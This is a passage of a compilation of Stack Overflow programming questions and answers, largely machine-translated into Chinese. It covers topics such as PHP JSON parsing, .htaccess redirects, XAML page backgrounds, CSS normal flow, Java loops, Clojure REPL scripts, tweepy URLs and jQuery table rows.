    NSRect frame = NSMakeRect(670, 400, 451, 351);
    NSUInteger styleMask =    NSBorderlessWindowMask;
    NSRect rect = [NSWindow contentRectForFrameRect:frame styleMask:styleMask];
    NSWindow * optionsWindow =  [[NSWindow alloc] initWithContentRect:rect styleMask:styleMask backing: NSBackingStoreBuffered    defer:false];
    [optionsWindow setBackgroundColor:[NSColor colorWithPatternImage:[NSImage imageNamed:@"opcionesbackground.gif"]]];
    [optionsWindow makeKeyAndOrderFront: optionsWindow];
    [optionsWindow setMovable:YES];

    NSRect deleteCache = NSMakeRect(225, 200, 89, 36);

    NSButton *button = [[NSButton alloc] initWithFrame:deleteCache];
    [button setButtonType:NSMomentaryPushInButton];
    //[button setImage:[NSImage imageNamed:@"rest_acepton.gif"]];
    [button setTitle:@"Eliminar cache"];
    [[button cell] setBackgroundColor:[NSColor redColor]];
    [button setAction:@selector(removeCache:)];
    [[optionsWindow contentView] addSubview:button];
    [button setNeedsDisplay:YES];

    NSRect accept = NSMakeRect(350, 20, 89, 36);

    NSButton *aceptar = [[NSButton alloc] initWithFrame:accept];
    [aceptar setButtonType:NSMomentaryPushInButton];
    [aceptar setImage:[NSImage imageNamed:@"rest_acepton.gif"]];
    [aceptar setBordered:NO];
    [aceptar setTarget:optionsWindow];
    [aceptar setAction:@selector(closeOptions:)];
    [[optionsWindow contentView] addSubview:aceptar];
    [aceptar setNeedsDisplay:YES];
}

-(void)closeOptions:(id)sender{
    [optionsWindow orderOut:nil];
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-18T14:06:46.760

根据您的来源，“optionsWindow”是方法 sOptions 的 ivar。你怎么能在另一种方法中使用？你能发布正确的来源吗

# php - Can't parse this JSON in php

> ID：11917150
> 
> 赞同：0
> 
> 时间：2012-08-11T19:50:11.330
> 
> 标签：php, json, yql

I'm trying to get off some mails from Yahoo Query Language using OAuth, everything is fine and alright, except, YQL returns JSON, and somehow I'm not able to parse it!

I'm able to parse simple JSONs like

```
'{"hello":"world"}' 
```

but not this one:

```
{
"query": {
    "count": 1,
    "created": "2012-08-11T19:22:51Z",
    "lang": "en-US",
    "results": {
        "result": {
            "messageInfo": [
                {
                    "from": {
                        "name": "account-services-us@cc.yahoo-inc.com"
                    },
                    "subject": "Success! You have shared your Yahoo! information"
                },
                {
                    "from": {
                        "name": "account-services-in@cc.yahoo-inc.com"
                    },
                    "subject": "Success! You have shared your Yahoo! information."
                },
                {
                    "from": {
                        "name": "account-services-in@cc.yahoo-inc.com"
                    },
                    "subject": "Success! You have shared your Yahoo! information."
                },
                {
                    "from": {
                        "name": "Yahoo!"
                    },
                    "subject": "Welcome to Yahoo!"
                }
            ]
        }
    }
}
} 
```

I tried validating it in [http://jsonlint.com/](http://jsonlint.com/)

and it's valid!

Edit: I need to display 'from:name' and 'subject' in a table like structure.

The code snippet I wrote is this:

```
$sdata = call_yql(OAUTH_CONSUMER_KEY, OAUTH_CONSUMER_SECRET,
               $access_token, $access_token_secret,
               false, true);
$json_data = json_encode($sdata);
$mails = json_decode($json_data);
print_r($mails->query); 
```

The Error i get is:

```
Notice: Trying to get property of non-object in C:\xampp\htdocs\yahoo\txtweb\yql.php       on line 21 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T19:55:46.367

See this url:-

[Parsing JSON file with PHP](https://stackoverflow.com/questions/4343596/parsing-json-file-with-php)

see also this url

[http://collegewires.com/parsing-json-with-php/](http://collegewires.com/parsing-json-with-php/)

or try it

To iterator over a multidimensional array, you can use the [RecursiveArrayIterator](https://stackoverflow.com/questions/1957133/php-spl-reference-documentation/4218646#4218646)

```
$jsonIterator = new RecursiveIteratorIterator(
    new RecursiveArrayIterator(json_decode($json, TRUE)),
    RecursiveIteratorIterator::SELF_FIRST);

foreach ($jsonIterator as $key => $val) {
    if(is_array($val)) {
        echo "$key:\n";
    } else {
        echo "$key => $val\n";
    }
} 
```

# sdk - 如何将 Nokia Nokia SDK 2_0 中的模拟器更改为 s40？

> ID：11917153
> 
> 赞同：3
> 
> 时间：2012-08-11T19:50:48.563
> 
> 标签：sdk, nokia, nokia-s40

我最近对修改诺基亚 s40 手机产生了兴趣，部分原因是我们家里有一部库存手机，还因为我从小就在 s40 系统中成长，所以我想我会去回忆一下车道。

我将为诺基亚 s40v5 开发，但我有点困惑。[在s40](http://www.developer.nokia.com/Develop/Series_40/)的此页面之后，您可以看到它似乎暗示 Nokia SDK 2.0 for Java（测试版）是可供下载的最新 SDK。

![在此处输入图像描述](../Images/3fc3fecdec568d95c698a0a435674c1f.png)

然而，在我下载并安装它之后，模拟器看起来不像我们拥有的 s40 设备和我过去拥有的设备。该模拟器看起来是全触摸屏，与 s40 完全不同。所以我的问题是，有没有办法改变这个模拟器的平台？我是否下载了错误的 SDK 包？如果是这样，如果这不是我开发所需的，为什么还要在 s40 页面上推广这个？最后，我可以下载什么最新版本来满足我的需求？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T05:30:19.730

您拥有的仿真器实际上是最新的[Series 40 设备](http://www.developer.nokia.com/search/search.xhtml?view=ds&k=&ob=pubdate&p1=fn:type&c1=must&o1=EQ&v1=fnType:Terminal&p3=dp:developer_platform&c3=must&o3=EQ&v3=dpDeveloperPlatform:s40_2_0)的 Series 40 仿真器。Series 40 现在是一个全触控平台。

[您可以在此页面](http://www.developer.nokia.com/Develop/Java/Tools/#article1)中查看 Series 40 的工具信息。实际上，您可以使用此 SDK 附带的 IDE，根据您的目标设备选择和下载较旧的 Series 40 SDK。[在此处](http://www.gorkem-ercan.com/2012/06/new-ide-based-on-eclipse-mtj.html)阅读我对 SDK 的介绍

**编辑：**

至此，开发者资源已移至：http: [//developers.apps.opera.com/](http://developers.apps.opera.com/)

虽然起初它看起来是针对“Nokia Asha”和“Nokia X”的，但您仍然可以找到“经典”内容，例如：

*   40 系列 SDK
*   适用于 Java 的诺基亚 SDK 1.1
*   适用于 Java 的诺基亚 SDK 2.0

# .htaccess - 301动态页面重定向

> ID：11917154
> 
> 赞同：0
> 
> 时间：2012-08-11T19:51:04.993
> 
> 标签：.htaccess, redirect, dynamic, get

嗨，我在其他线程中显示的 htaccess 中尝试了 modewriter 的各种方法。我想将我的网址从 重定向`www.example.com/categories.php?category=1`到`www.example.com/categories/science`。

我也很感激一个我错的例子。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-12T05:41:52.270

假设它只是你想要重定向的这个 URL，它会像：

```
RewriteEngine on
RewriteCond %{QUERY_STRING} ^category=1$ [NC]
RewriteRule ^categories.php$ www.example.com/categories/science/? [L,R=301] 
```

这是在您使用 .htaccess 文件的情况下，否则添加前置斜杠：

```
RewriteRule ^/categories.php$ www.example.com/categories/science/? [L,R=301] 
```

查询字符串将被丢弃。如果您想在浏览器的地址栏中向用户显示它，请仅输入 [R]。考虑一下你想要服务的状态，如果它是永久的，谷歌喜欢 301。

接下来，您必须使用目录 www.example.com/categories/science 中的 index.php 捕获传入请求

祝你好运！

# android - 如何在活动之间的动画中设置动态值？

> ID：11917156
> 
> 赞同：3
> 
> 时间：2012-08-11T19:51:28.143
> 
> 标签：android, animation

我需要使用自定义动画为传入活动设置动画，其中一些值是在运行时计算的。

目前我知道这一点：

```
overridePendingTransition(R.anim.enter, R.anim.leave); 
```

但这仅适用于 XML 动画。

有没有办法/技巧/黑客来设置程序动画或更改参数？

一种可能是在开始新活动之前为“离开”部分设置动画，并在新活动的 onFocusChanged / onResume 中“进入”部分，但这不起作用（已经测试了一下），因为旧活动必须是在新活动出现时可见。

我想到的另一件事是在运行时生成 XML 动画文件，保存在文件夹中并在`overridePendingTransition(R.anim.enter, R.anim.leave);`. 当某些参数（例如确切的屏幕尺寸）已知时，我会在应用程序启动或类似情况下执行此操作。但我不知道这是否可能。

为 API 7 开发，支持包...

提前致谢。

# iphone - 不从子类调用 [super viewDidLoad] 和 [super dealloc]

> ID：11917162
> 
> 赞同：0
> 
> 时间：2012-08-11T19:52:18.367
> 
> 标签：iphone, objective-c, subclass, superclass

我有这 3 个课程：

```
@interface BaseViewController : UIViewController
@interface BaseWebViewController : BaseViewController
@interface SecondaryWebViewController : BaseViewController 
```

在 AppDelegate 中，我将 rootViewController 设置为 BaseWebViewController，它在应用程序的整个生命周期中永远不会被取消分配。在 BaseWebViewController 中，我在各自的方法中调用 [super viewDidLoad] 和 [super dealloc]。

在大多数应用程序中，用户将在 BaseWebViewController 上的 UIWebView 中导航。但是在某些链接上，我需要推送（然后弹出）SecondaryWebViewController。

我的问题是，由于 BaseWebViewController 和 SecondaryWebViewController 都是 BaseViewController 的子类，我不确定在 SecondaryWebViewController 中调用 [super viewDidLoad] 和 [super dealloc] 该怎么做。

在 SecondaryWebViewController 中，我一直在调用这些 [super viewDidLoad] 和 [super dealloc]，但我注意到它会导致一些问题，尤其是在调用 [super dealloc] 时会出现随机崩溃。由于 BaseWebViewController 必须始终存在于应用程序的整个生命周期中，因此我不希望在 BaseViewController 上调用 dealloc。

抱歉，如果这听起来令人困惑，但本质上，流程如下所示：

1.  AppDelegate 将 rootViewController 设置为 BaseWebViewController
2.  BaseWebViewController 的 viewDidLoad 也调用了超类 BaseViewController 的 viewDidLoad
3.  应用程序的大部分生命周期都花费在 BaseWebViewController 中，但偶尔需要推送 SecondaryWebViewController
4.  SecondaryWebViewController 的 viewDidLoad 和 dealloc 调用超类的 viewDidLoad 和 dealloc 导致奇怪的行为。

目前，如果我在 SecondaryWebViewController 中注释掉 [super viewDidLoad] 和 [super dealloc] 以便 BaseViewController 永远不会被释放，那么一切运行正常。但是，我不知道这是否是正确的做事方式。

在这种情况下，在子类中调用超函数的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:32:22.553

如果我理解正确，那么您就是在混合类和对象的概念。

根据您的描述，您的应用中有两个视图控制器*对象*。其中一个是类的*实例*，`BaseWebViewController`另一个是类的*实例*`SecondaryWebViewController`。

这两个实例是完全分开的。

当您的调用*实例*时，当它调用this 时，它只会调用类的 dealloc 方法-**在同一个实例上。**另一个视图控制器实例完全不受影响。`SecondaryWebViewController``dealloc``[super dealloc]``BaseWebViewController`

 **我可能完全误解了，在这种情况下，请原谅我。如果我理解正确的话，你应该查一下类和对象的概念，这是继续下去的重要基础。**

# xaml - 如何在 Metro 应用程序中设置页面背景

> ID：11917166
> 
> 赞同：4
> 
> 时间：2012-08-11T19:53:00.310
> 
> 标签：xaml, windows-8, microsoft-metro, winrt-xaml

我有奇怪的问题。我无法在 Metro 应用程序中为我的页面设置背景。下面是我的 xaml 结构的简单视图

```
<Page Background="White">
    <ListView Background="Red">

    </ListView>
</Page> 
```

问题是页面的背景是黑色的。所以我在黑色背景上设置了红色矩形（ListView 区域）。我希望我的页面是白色的。我看到了几个例子，似乎我做得很好。我也尝试过使用刷子，但结果相同。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-12T08:19:41.007

If you want your app to have a white background on all pages, then the easiest way to achieve this is to set the **RequestedTheme** on Light in the App.xaml file. This will not only give you a white background, but it will automatically change all other colors too, like the foreground color (for text etc.) will be black by default.

```
<Application xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
             ...
             RequestedTheme="Light"> 
```

For a single page I've always used a grid as rootcontainer in a page and that worked fine:

```
<common:LayoutAwarePage
    x:Name="pageRoot"
    ... 
    >

    <Grid Background="White"> 
```

Note that if you want to use an image as background instead of a color, you'll have to work with attached properties:

```
<Grid>
    <Grid.Background>
        <ImageBrush x:Name="backgroundGrid" ImageSource="/Assets/Paper.jpg" />
    </Grid.Background> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-11T21:16:10.100

我认为您遇到的问题是页面的默认样式覆盖了您设置背景颜色的尝试。

如果您查看文件 StandardStyles.xaml，它包含一个 LayoutRootStyle（在文件的最后）。如果您将值从默认值更改为十六进制颜色值（例如，#FFFF0000 将给您红色），应用程序的背景将相应更改。这是做你想做的事的简单方法，但可能不是最佳实践。

```
<Style x:Key="LayoutRootStyle" TargetType="Panel">
    <Setter Property="Background" Value="{StaticResource ApplicationPageBackgroundThemeBrush}"/>
    <Setter Property="ChildrenTransitions">
        <Setter.Value>
            <TransitionCollection>
                <EntranceThemeTransition/>
            </TransitionCollection>
        </Setter.Value>
    </Setter>
</Style> 
```

或者，您可以为根 Grid 元素设置背景，这将为您提供更精细的控制。或者，您可以在页面的 Page.Resources 部分中创建覆盖 LayoutRootStyle 的自定义样式，方法是将规则复制到该部分，然后修改背景设置器的值。

它应该是这样的：

```
<Page.Resources>
    <Style x:Key="LayoutRootStyle" TargetType="Panel">
        <Setter Property="Background" Value="#FFFF0000"/>
        <Setter Property="ChildrenTransitions">
            <Setter.Value>
                <TransitionCollection>
                    <EntranceThemeTransition/>
                </TransitionCollection>
            </Setter.Value>
        </Setter>
    </Style>
</Page.Resources> 
```

希望有帮助。

# html - 使元素脱离正常流程的 CSS 属性是什么？

> ID：11917168
> 
> 赞同：48
> 
> 时间：2012-08-11T19:53:20.390
> 
> 标签：html, css, dom, position

使元素脱离正常流程的 CSS 属性是什么？此类属性将是 float、position:absolute 等。

这个问题涉及正常流量的所有可能变化。

* * *

## 回答 #1

> 赞同：64
> 
> 时间：2012-08-11T19:56:54.197

只有以下属性会影响任何给定元素的正常流动：

*   `float: right|left`
*   `position: absolute|fixed`

只是为了完整性：

*   `display: none`从流中移除元素（严格来说，元素不会有流序）

*   `position: relative`不会改变元素的流动顺序，但会改变其相对于正常流动位置的位置。

*   `visibility: hidden`将保持流上的元素，但不会将其渲染到视口。

# android - Android 应用程序：未安装任何内容

> ID：11917170
> 
> 赞同：0
> 
> 时间：2012-08-11T19:53:45.597
> 
> 标签：android, installation

我做了很多搜索，但找不到解决我的问题的方法。我有一个完整的 Android 应用程序，可以在模拟器中完美运行。签名过程运行良好，但是当我在手机上复制 .apk 文件并尝试安装它时，它说没有安装任何东西。

通过 eclipse 和 USB 电缆安装应用程序有效，但我不能以这种方式共享应用程序。

此外，接受未知来源的应用程序。

你有什么主意吗？我很尴尬，我不得不在这里问这个，但我没有看到其他方式......

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T19:59:21.140

如果您之前安装了调试签名的应用程序。然后，您需要先卸载该应用程序。打开终端并输入`adb uninstall <your app package name>`

# actionscript-3 - 如何将带有 Document 类的两文件预加载器和游戏 swf 转换为单个 swf？

> ID：11917176
> 
> 赞同：0
> 
> 时间：2012-08-11T19:54:50.433
> 
> 标签：actionscript-3, flash-cs5, preloader

我制作了一个游戏，它在两个文件中运行，一个是预加载器，一个是 swf。当我将这两个文件一起使用时，它们可以正常工作，但是一些 Flash 门户只需要一个 SWF，所以我试图找到一种最短路径的方法来将其转换为只使用一个。

游戏 swf 使用包含包、类构造函数和大量函数的文档类，并且运行良好。我在我的代码中引用的舞台上有很多电影剪辑。代码是这样的（删节）：

```
package  {

    import flash.display.MovieClip;
    import flash.events.MouseEvent;
...
    public class Game extends MovieClip {       
    var EnemyArray:Array;
    var HeroArray:Array;
...
public function Game() { // class constructor
        EnemyArray = new Array();
        addEventListener(Event.ENTER_FRAME,onEnterFrame);
                    mainRestartButton.addEventListener(MouseEvent.CLICK, RestartLevel);
...
}
public function KeyPressed(event:KeyboardEvent):void
    {
        if (event.keyCode == Keyboard.SPACE)
        {
        attack();
...
            }
} // End of class
} // End of package 
```

我还有另一个 swf，我的预加载器，它在第 1 帧中有以下代码：

```
import flash.display.Loader;
import flash.net.URLRequest;
import flash.events.ProgressEvent;
import flash.events.Event;

var myLoader:Loader = new Loader();
myLoader.contentLoaderInfo.addEventListener(ProgressEvent.PROGRESS, onLoading);
var myURL:URLRequest = new URLRequest("Game.swf");
myLoader.load(myURL);
myLoader.contentLoaderInfo.addEventListener(Event.COMPLETE, onComplete);

function onLoading(event:ProgressEvent):void {
    var loaded:Number = event.bytesLoaded / event.bytesTotal; 
    percent_txt.text = "Loading: " + (loaded*100).toFixed(0) + "%";

}

function onComplete(event:Event):void { 
    myLoader.contentLoaderInfo.removeEventListener(ProgressEvent.PROGRESS, onLoading);
    myLoader.contentLoaderInfo.removeEventListener(Event.COMPLETE, onComplete);
    this.addChild(myLoader);
} 
```

我已经在线浏览了各种各样的解决方案，但它们似乎都不适用于我的代码设置方式，例如：[如何在 AS3 中创建预加载器](https://stackoverflow.com/questions/8410774/how-to-create-preloader-in-as3)

我尝试了他的选项 1，将我的文档类中的所有代码（包和构造函数除外）粘贴到第 2 帧中。但是它返回“错误 #1009：无法访问空对象引用的属性或方法”。对舞台上项目的任何引用，例如：

```
 mainRestartButton.addEventListener(MouseEvent.CLICK, RestartLevel); 
```

正如他所提到的，“如果您以大多数资产（图像等）都在 Flash IDE 库中并且没有在第一帧加载（您可以在每个库项目的特性）。” 我的项目不是以这种方式组织的。

对我来说，重组我的 FLA/代码以便他们可以在单个 swf 中拥有预加载器的最简单方法是什么？

非常感谢您的时间和帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T23:49:01.573

我使用 FlashDevelop（无 FLA），所以我不确定它是否适合您，但我使用[此处描述的解决方案。](http://northwaygames.com/?p=372)

# java - java中的非防御方法是什么？

> ID：11917179
> 
> 赞同：0
> 
> 时间：2012-08-11T19:55:20.903
> 
> 标签：java

我被一个模拟考试问题困住了。

我已经写了下面的课程并且它有效。但是，在`powN`方法的主体中，我需要使用`for(){}`循环。我还需要使用`powN`.

这是我的问题。如何使用 for 循环？什么是非防御方法以及如何使用它`powN`？

```
public class Power {
    private double x = 0;

    Power(double x) {
        this.x = x;
    }

    public double getX() {
        return x;
    }

    public double powN(int n) {
        return Math.pow(getX(), n);
    }

    public static void main(String[] args) {
        Power p = new Power(5.0);
        double d = p.powN(2);
        System.out.println(d);
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T20:01:05.057

> 我的问题是如何使用 for 循环

我不熟悉java语法，但想法是：

```
public double powN(int n) {

    double tmp=1;
    for (int i=0;i<n;i++) {
        tmp=tmp*getX();
    }
    return tmp;
} 
```

不知道非防御是什么意思

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T20:46:13.197

我已经从您的材料中阅读了有关*防御性/非防御性方法的幻灯片。*我猜你的教授希望你检查参数是否有效。像这样：

```
 public double powN(int n) {
    if (n < 0) {
      throw new UnsupportedOperationException("Only positive values are supported");
    }
    double tmp = 1;
    for (int i = 0; i < n; i++) {
      tmp = tmp * getX();
    }
    return tmp;
  } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-11T20:04:42.697

非防御性只是意味着您没有专门编码来检查错误，例如如果 n == 0，则返回 0。

相反，您只需采用 n 的任何值并在 for 循环中使用它的值。

因此，不要使用内置的 Math 函数，只需编写一个 For 循环来做同样的事情。

```
double result = 0.0
for (int i = 0; i < n; i++) {
   result = result * x;
} 
```

# c# - 更改实体框架的 app.config 中的连接字符串

> ID：11917181
> 
> 赞同：1
> 
> 时间：2012-08-11T19:55:49.673
> 
> 标签：c#, entity-framework, connection-string

我正在使用实体框架。在 app.config 中存储了 EF 为我的数据库生成的连接字符串。

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>
  </configSections>
  <connectionStrings>
    <add name="votemeEntities" connectionString="metadata=res://*/VoteModel.csdl|res://*/VoteModel.ssdl|res://*/VoteModel.msl;provider=MySql.Data.MySqlClient;provider connection string=&quot;server=localhost;User Id=root;database=voteme&quot;"
      providerName="System.Data.EntityClient" />
    <add name="VoteMe.Properties.Settings.votemeConnectionString"
      connectionString="server=localhost;User Id=root;database=voteme"
      providerName="MySql.Data.MySqlClient" />
  </connectionStrings>
</configuration> 
```

我需要在这个连接字符串中设置 Charset。我该怎么做才能让我的 EF 使用这个连接字符串没有任何问题？谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T19:59:14.060

您可以在 EF 连接字符串的末尾添加属性，就在`&quot;`.

```
...abase=voteme;charset=UTF8;&quot;"
    providerName="System.Data.EntityClient" /> 
```

只需确保该值是正确的 XML 转义（如果需要），否则您将破坏配置文件。

# clojure - 我的 clojure 函数在 repl 中定义时有效，但在从脚本加载时无效

> ID：11917182
> 
> 赞同：1
> 
> 时间：2012-08-11T19:56:09.980
> 
> 标签：clojure

我在 Windows XP (JVM=1.6.0) 上使用 Clojure 1.4.0。

我的`help.clj`脚本包含我认为有用的 Clojure 代码片段。

在 Clojure`repl`中，我可以使用`(load-file "help.clj")`.

我写的很花哨`(defn clojure-help [] (load-file "help.clj"))`。现在一个简单的`(clojure-help)`加载它。

然后我尝试将该`clojure-help`函数放入`repl`我使用的启动脚本中。

但是现在调用`(clojure-help)`会导致以下异常：

`CompilerException java.lang.RuntimeException: Unable to resolve symbol: clojure-help in this context`

我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-12T03:45:07.800

感谢您在上面的评论中发布代码！没有代码，就不可能知道实际发生了什么。进行一项简单的更改似乎可以解决问题：

```
(defn my-prompt [] (printf "\n[%s]> " (ns-name *ns*)))

(defn p1 [] (clojure.main/repl :prompt my-prompt))

(defn clojure-help [] (load-file "help.clj"))

(p1) 
```

更改是将`(p1)`调用移动到脚本的*末尾*。如果调用不在脚本末尾，则 Clojure 在评估脚本中的其余函数之前会进入 REPL，因此它们在 REPL 中不可用。由于是在您的脚本中调用*之后*`clojure-help`定义的，因此直到退出 REPL 后才对其进行评估。*`(p1)`*

 ** * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-11T21:55:34.293

如果您不使用 repl 加载其他脚本，则可以执行以下操作：

```
clojure --init replstartup.clj --repl 
```

replstartup.clj 将包含您的闭包帮助功能。

或者，您可以创建一个批处理文件，名为 clojure-repl.bat（或类似的东西），看起来像这样。

```
@echo off
java -cp %userprofile%\clojure-1.4.0.jar clojure.main --init repl-startup.clj --repl
@echo on 
```*

# python - 如何使用 tweepy 打印出完整的 url？

> ID：11917184
> 
> 赞同：10
> 
> 时间：2012-08-11T19:56:51.087
> 
> 标签：python, tweepy

如何在 tweepy（而不是 t.co 链接）中打印出完整的 url？以下代码打印出“这是一个测试链接[http://t.co/93Hme7Jv](http://t.co/93Hme7Jv) 90210”，即使 twitter.com 显示“这是一个测试链接[http://www.test.com/test](http://www.test.com/test) 90210”。

```
import tweepy, random

consumer_key="my_key"
consumer_secret="my_secret"
access_token="my_access"
access_token_secret="my_token"

rand = random.randint(1,999999999)

if __name__ == '__main__':
    auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
    auth.set_access_token(access_token, access_token_secret)
    status = tweepy.API(auth)
    tweepy.API(auth).update_status('this is a test link http://www.test.com/test %s' % (rand))
    user = 'test_user'
    for status in tweepy.Cursor(status.user_timeline, id=user).items(20): 
        print status.text 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-11T20:04:06.427

不确定如何使用 tweepy，但您希望设置[`include_entities`](https://dev.twitter.com/docs/tweet-entities)为 True，并且 Twitter API 将包含`t.co`带有响应的 URL 的完整 URL。

大概是这样的：

```
for status in tweepy.Cursor(status.user_timeline, id=user, include_entities=True).items(20): 
    for url in status.entities['urls']:
         print url['expanded_url'] 
```

# r - POSIXct 和 xts 中的时区，从 R 中的 GMT 转换

> ID：11917185
> 
> 赞同：7
> 
> 时间：2012-08-11T19:56:52.463
> 
> 标签：r, timezone, xts, posixct, timestamp-with-timezone

我在一个对象中有一堆 1 分钟返回，`xts`索引`POSIXct`为 GMT，时区为 GMT。回报在纽约证券交易所，所以我想转换为东部时区，但我想妥善处理夏令时。这样做的最佳方法是什么？我对 EST 时区和 EDT 时区有点困惑。我希望我的时间在冬季和夏季正确转换为纽约时间。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-11T20:13:08.763

使用`indexTZ<-`和`America/New_York`时区

```
> tail(SPY)
                    SPY.Bid.Price SPY.Ask.Price SPY.Trade.Price SPY.Mid.Price SPY.Volume
2012-08-09 19:54:00        140.47        140.48          140.48       140.475       2372
2012-08-09 19:55:00        140.46        140.47          140.46       140.465       5836
2012-08-09 19:56:00        140.47        140.48          140.48       140.475       2538
2012-08-09 19:57:00        140.47        140.48          140.47       140.475       2209
2012-08-09 19:58:00        140.48        140.49          140.49       140.485       4943
2012-08-09 19:59:00        140.58        140.59          140.58       140.585      16780
> indexTZ(SPY) <- "America/New_York"
> tail(SPY)
                    SPY.Bid.Price SPY.Ask.Price SPY.Trade.Price SPY.Mid.Price SPY.Volume
2012-08-09 15:54:00        140.47        140.48          140.48       140.475       2372
2012-08-09 15:55:00        140.46        140.47          140.46       140.465       5836
2012-08-09 15:56:00        140.47        140.48          140.48       140.475       2538
2012-08-09 15:57:00        140.47        140.48          140.47       140.475       2209
2012-08-09 15:58:00        140.48        140.49          140.49       140.485       4943
2012-08-09 15:59:00        140.58        140.59          140.58       140.585      16780
Warning message:
timezone of object (America/New_York) is different than current timezone (GMT). 
```

# c++ - STL 容器适配器不一致

> ID：11917188
> 
> 赞同：2
> 
> 时间：2012-08-11T19:56:58.223
> 
> 标签：c++, data-structures, stl

STL[队列](http://www.cplusplus.com/reference/stl/queue/)有`front()`和`back()`方法，但[堆栈](http://www.cplusplus.com/reference/stl/stack/)只有`top()`，而没有`bottom()`。为什么呢？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-11T20:03:19.087

唯一的原因`stack`是禁止访问被包裹的容器，除非作为堆栈，即仅访问顶部。如果您想要一个可以用作堆栈但不限于仅用作堆栈的容器，那么您可以使用不同的序列容器，例如 raw `vector`。

同样，唯一的原因`queue`是禁止访问被包装的容器，除非作为队列，即访问前和后。如果您想要一个可以用作队列但不限于仅用作队列的容器，那么您可以使用不同的序列容器，例如 raw `vector`。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T20:05:03.797

队列通常表示先进先出 (FIFO) 缓冲区。您可以访问两端。一端有最新的项目，另一端有最旧的项目。您可能希望从将元素添加到队列的代码中访问最新的项目，并从处理队列中的项目的代码中访问最旧的项目。

堆栈通常表示后进先出 (LIFO) 缓冲区。您只能访问一端，即最近添加到堆栈中的项目。所以只需要一个top()，没有bottom()。

# javascript - 如何将 jquery 中的类添加到已加载的内容中？

> ID：11917190
> 
> 赞同：0
> 
> 时间：2012-08-11T19:57:28.177
> 
> 标签：javascript, jquery

我的要求是单击（+）按钮，表中的行应该不断添加。我已经使用下面给定的代码实现了这一点。同样，当单击“删除”按钮时，相应的行也会被删除。两种功能都运行良好。问题是当最后一行被删除时，&当单击“（+）”按钮时，行不增加，bcoz 的 removeClass 函数。任何人都可以帮助如何检查删除的行是最后一行以及如何将添加类添加到前一行。下面给出的编码 r。请帮助解决此问题。我是编码方面的新手，如果编码中有任何错误，请突出显示。提前致谢..

```
<html>
<head>
<script type="text/javascript" src="jquery-1.7.2.min.js"></script>
<script type="text/javascript">
$(document).ready( function() {
id=1;
$('#butVal').click(function(){

        var master = $(this).parents("#table-2");
        id++;   
        var sample = master.find('.tabRow').clone();    
        sample.attr("id", id + "item"); 
        master.find('.tabRow').removeClass();
        master.find('tbody').append(sample);
        //alert(master);
        //alert(sample);
        //alert(sample.html());
      //alert(master.html());

var rowLen =  $('#table-2 > tbody >tr').length;

//alert(rowLen);
if(rowLen>9)
{
alert("no of row is reached 10");
}

   }

);

$('table#table-2 button.remove').live('click', function(){

var rem =$(this).parents('tr').remove();
} );

});

//jquery ends here
</script>

<style type="text/css">
.add select
{
width:100%;
}
</style>
<body>

<table id="table-2" class="add" border ="1">

<thead>
<!-- <tr><td><button id="butVal">Click</button></td></tr> -->
<tr><th> S.No</th><th> Product Status </th> <th> Stock Status</th> <th> Description</th> <th> Quantity </th> <th> Price </th> <th>  Total </th >
<th> <button id="butVal"> + </button></th></tr> 
</thead>

<tbody>
<tr class="tabRow" id="1item">
<td> <input type="text" name="sno"/> </td>
<td><select><option> New </option><option> Old </option></select> </td>
<td><select><option> In Stock </option><option> Out Of Stock </option></select> </td>
<td> <input type="text" name="desc"/>  </td>
<td> <input type="text" name="qty"/> </td>
<td> <input type="text" name="price"/> </td>
<td> <input type="text" name="total"/> </td>
<td><button class="remove">Remove</button></td>
</tr>
</tbody>

<tfoot>
<tr>

<td> &nbsp; </td>
<td> &nbsp; </td>
<td> &nbsp; </td>
<td> &nbsp; </td>
<td> &nbsp; </td>
<td> Grand Total </td>
<td> &nbsp; </td>
<td> <center>  </center> </td>

</tr>
</tfoot>

</table>

</div>

</body>

</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T20:18:52.910

当您 `tr` 在 remove 函数中删除最后一个然后尝试添加新的 `tr`时，它会失败，因为没有要克隆并附加到 DOM`tr`的 class 属性的标记。`.tabRow`

所以在删除最后一个之前的删除函数中 `tr` ，你应该在最后一个之前添加`.tabRow`类 `tr` 。你可以使用[jquery prev()](http://api.jquery.com/prev/)方法来做到这一点。

更新 ：

我检查了您的代码并对其进行了如下编辑：

1-在添加函数中，我添加了应该删除的类名

```
 master.find('.tabRow').removeClass('tabRow'); 
```

2-在删除功能中我添加了 2 个条件。首先检查当前单击的 tr 是否是唯一的 tr ，停止删除它。第二，如果当前单击的 tr 是最后一行，则将 tabRow 类添加到其上一行

```
 if($("table#table-2 tbody tr").length > 1)
  {
     if($("table#table-2 tbody tr").index($(this).parents('tr')) ==$("table#table-2 tbody tr").length -1)
     {
       $(this).parents('tr').prev().addClass("tabRow");
     }
     $(this).parents('tr').remove();
  }
 else
 {
    alert("you can.t remove this record");
 } 
```

它对我来说应该是有效的。

# delphi - 如何获取设备的驱动程序文件？

> ID：11917191
> 
> 赞同：1
> 
> 时间：2012-08-11T19:57:48.610
> 
